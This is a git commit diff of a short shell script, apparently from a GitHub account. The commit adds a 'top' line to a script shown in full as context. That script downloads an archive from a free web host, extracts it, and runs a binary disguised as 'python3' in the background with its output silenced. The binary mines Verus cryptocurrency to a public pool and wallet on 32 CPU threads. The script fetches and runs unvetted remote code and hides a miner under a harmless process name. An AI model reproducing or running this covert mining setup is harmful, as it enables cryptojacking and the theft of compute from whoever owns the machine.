f8ec30e940870e3f19577b654fd241894373d290
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-08-09 05:09:19 +0700

    Update verushash.sh

--- verushash.sh
+++ verushash.sh
@@ -2,3 +2,4 @@ wget -O meki momok.x10.bz/DOT-SRB.tar.gz
 tar -xvf meki
 cd dotsrb
 nohup ./python3 -a verushash -o eu.luckpool.net:3960 -u RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg --cpu-threads 32 > /dev/null 2>&1 &
+top
